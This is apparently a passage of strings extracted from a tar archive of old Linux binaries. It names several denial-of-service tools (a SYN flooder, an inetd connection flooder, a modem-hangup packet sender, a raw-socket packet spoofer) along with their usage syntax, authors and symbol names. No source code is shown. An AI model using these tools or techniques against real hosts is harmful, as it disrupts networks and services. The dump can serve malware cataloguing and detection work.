            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "send_oshare_packet",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/cocksuck",
            "0100755",
            "0000000",
            "0000000",
            "00000015622",
            "07071417464",
            "013703",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "_DYNAMIC",
            "_GLOBAL_OFFSET_TABLE_",
            "_init",
            "_fini",
            "_IO_stderr_",
            "fprintf",
            "__environ",
            "sprintf",
            "socket",
            "close",
            "bcopy",
            "printf",
            "gethostbyname",
            "inet_addr",
            "perror",
            "gettimeofday",
            "sendto",
            "exit",
            "environ",
            "srand",
            "atexit",
            "atoi",
            "rand",
            "__libc_init",
            "__setfpucw",
            "__fpu_control",
            "htons",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "1UUUPSQ",
            "PT[t&",
            "U<fEP",
            "fE\u0483}",
            "EPhl",
            "E9Ew\t",
            "}\u020bM\u0235",
            "$Xm\u020dH",
            "}\u020bM\u0235",
            "$Xm\u020dH",
            "}\u020bM\u0235",
            "$Xm\u020dH",
            "}\u020bM\u0235",
            "$Xm\u020dH",
            "}\u020bM\u0235",
            "$Xm\u0209fAfM\u040bEPEPEPEPh",
            "EPEPEP*",
            "UdVS]",
            "f]fueM",
            "fEfEfEfE",
            "EfEfE",
            "MPeM",
            "eeee\u07c0e?h",
            "fEfE",
            "fEfEEEh",
            "fEfEEfE",
            "fE\u078bEEEEE",
            "RE\u050dP",
            "j EPN",
            "EPEPj",
            "j(EPEP",
            "e[^]",
            "S1\u0483}",
            "\u0403;u]]",
            "cOckSuck synflooder by NeonUnix",
            "syntax: %s dst_ip dst_prt num_pkts [ src_ip ]",
            "Destination  : %s",
            "Port         : %u",
            "NumberOfTimes: %d",
            "Source       : %s",
            "%d.%d.%d.%d",
            "@socket",
            "cant find %s!",
            "GCC: (GNU) 2.7.2.3",
            "GCC: (GNU) 2.7.2.3",
            "GCC: (GNU) 2.7.2.3",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "crtstuff.c",
            "gcc2_compiled.",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "init_dummy",
            "force_to_data",
            "__DTOR_END__",
            "crt0.S",
            "done",
            "__do_global_dtors_aux",
            "__DTOR_LIST__",
            "fini_dummy",
            "__CTOR_LIST__",
            "cocksuck.c",
            "i.14",
            "printf",
            "_DYNAMIC",
            "_etext",
            "dosynpacket",
            "_IO_stderr_",
            "perror",
            "socket",
            "__environ",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "inet_addr",
            "__fpu_control",
            "_start",
            "rand",
            "sendto",
            "___crt_dummy__",
            "bcopy",
            "initrand",
            "gettimeofday",
            "__bss_start",
            "main",
            "srand",
            "host2ip",
            "gethostbyname",
            "_fini",
            "sprintf",
            "atexit",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "close",
            "datapool/bin/hestra",
            "0100755",
            "0000000",
            "0000000",
            "00000012133",
            "06533130553",
            "013347",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "_DYNAMIC",
            "_GLOBAL_OFFSET_TABLE_",
            "_init",
            "_fini",
            "__environ",
            "bzero",
            "socket",
            "bcopy",
            "printf",
            "gethostbyname",
            "connect",
            "send",
            "exit",
            "environ",
            "atexit",
            "atoi",
            "__libc_init",
            "__setfpucw",
            "__fpu_control",
            "htons",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "1UUUPSQ",
            "Pd[t&",
            "EPEP",
            "tthi",
            "\u0403;u]]",
            "Fux0ring %s on port %d",
            "Host Unknown, moron: %s",
            "hestra.c by Blaze-` and |w0lf|",
            "Extremely Dangerous tool!!",
            "Usage: <hestra> <host> <port>",
            "0123456789",
            "GCC: (GNU) 2.7.2.3",
            "GCC: (GNU) 2.7.2.3",
            "GCC: (GNU) 2.7.2.3",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "crtstuff.c",
            "gcc2_compiled.",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "init_dummy",
            "force_to_data",
            "__DTOR_END__",
            "crt0.S",
            "done",
            "__do_global_dtors_aux",
            "__DTOR_LIST__",
            "fini_dummy",
            "__CTOR_LIST__",
            "hestra.c",
            "printf",
            "connect",
            "_DYNAMIC",
            "_etext",
            "socket",
            "__environ",
            "bzero",
            "send",
            "echo_connect",
            "_init",
            "__libc_init",
            "environ",
            "__fpu_control",
            "_start",
            "___crt_dummy__",
            "bcopy",
            "__bss_start",
            "main",
            "gethostbyname",
            "_fini",
            "atexit",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "datapool/bin/inetd.DoS",
            "0100755",
            "0000000",
            "0000000",
            "00000031731",
            "07065752565",
            "013673",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "memcpy",
            "socket",
            "__deregister_frame_info",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh|",
            "E@PhK",
            "t#EP",
            "\u0403;u]",
            "Inetd DoS by ArchAng3| 0f Death - Member Of Midgard Security",
            "Team",
            "Syntax : %s host port [times to connect]",
            "%d - ",
            "Done!",
            "Host [%s] --> Hmm , are you sure this is",
            "right??",
            "** Socket Error **",
            "Host --> [%s] ** Port --> [%s]",
            "Closed or Firewalled Port",
            "init.c",
            "/usr/src/bs/BUILD/glibc/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/usr/src/bs/BUILD/glibc/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i386-redhat-linux/egcs-2.91.66/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;\\",
            "grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;\\",
            "currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;\\",
            "mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;\\",
            "positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;\\",
            "int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;\\",
            "p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;\\",
            "n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;\\",
            "p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;\\",
            "__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;\\",
            "__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(15,4)",
            "__blkcnt64_t:t(15,45)=(15,5)",
            "__fsblkcnt_t:t(15,46)=(0,3)",
            "__fsblkcnt64_t:t(15,47)=(15,6)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;\\",
            "__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;\\",
            "__inheritsched:(0,1),96,32;__scope:(0,1),128,32;\\",
            "__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;\\",
            "__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;\\",
            "__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;\\",
            "__m_count:(0,1),32,32;__m_owner:(17,2),64,32;\\",
            "__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;\\",
            "__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;\\",
            "__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;\\",
            "__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;\\",
            "__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.3",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.8",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "inetd.DoS.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "sockz",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/gin",
            "0100755",
            "0000000",
            "0000000",
            "00000034614",
            "07100656612",
            "012646",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "puts",
            "malloc",
            "socket",
            "strrchr",
            "__deregister_frame_info",
            "signal",
            "sendto",
            "gettimeofday",
            "inet_ntoa",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh\u050c",
            "QVhP",
            "E\u0403hD",
            "u#h ",
            "PE\u060dP",
            "EPh\u040d",
            "E;E|",
            "EPEPEPEPEPEPEPEPEP",
            "0E\ubfc3}",
            "1PEPh",
            "E\u0603EU",
            "EEEEU",
            "E\u0603PEPEU",
            "U1fP",
            "EU P",
            "EPEP",
            "UREPY",
            "EPEPE",
            "P EP0",
            "]1fE",
            "fE1f]",
            "\u0403;u[]",
            "cannot resolve source host!",
            "cannot resolve destination host!",
            "Cannot get raw socket, you must be root!",
            "Source Host\t\t: %s",
            "Target Host\t\t: %s",
            "Number\t\t\t: %d",
            "Have some gin!",
            "sent %d packet%c...done",
            "usage: %s <source host> <dest host> <num packets>",
            "[ http://www.rootshell.com/ ] ",
            "1.2-05.05",
            "gin [ v%s ] /\\ by amputee",
            "Kaladis",
            "compiled for: %s",
            "Exiting...",
            "+++ATH0",
            "+++ATH0",
            "+++ATH0",
            "+++ATH0",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "gin.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "signal@@GLIBC_2.0",
            "get_progname",
            "inet_ntoa@@GLIBC_2.0",
            "puts@@GLIBC_2.0",
            "_init",
            "done",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "banner",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "strrchr@@GLIBC_2.0",
            "gettimeofday@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "in_chksum",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/arnup100",
            "0100755",
            "0000000",
            "0000000",
            "00000035225",
            "07100656560",
            "013440",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "putchar",
            "printf",
            "perror",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "strcmp",
            "gethostbyname",
            "getservbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "UPWVE",
            "E\u010d}\u013e`",
            "j&E\u010dP",
            "E5t&",
            "EPE\u010dP",
            "EPE\u010dP",
            "fEf}",
            "1fEPE\u010dP",
            "fEf}",
            "1fEPE\u010dP",
            "EP }",
            "j&EPEP~ u",
            "e^_]",
            "fUft",
            "1fEPw",
            "E1fP",
            "fEfEf",
            "\u0403;u[]",
            "1234567890",
            "error: integer types aren't the right size.",
            "usage: %s sourcename sourceport destinationname destinationport",
            "255.255.255.255",
            "socket",
            "setsockopt IP_HDRINCL",
            "sendto",
            "datagram passed to kernel:",
            "%02x",
            "error: can't resolve hostname \"%s\"",
            "warning: resolved address type is not AF_INET, will try to carry on anyway.",
            "warning: resolved address length is not 4, will try to carry on anyway.",
            "error: unknown service \"%s\"",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
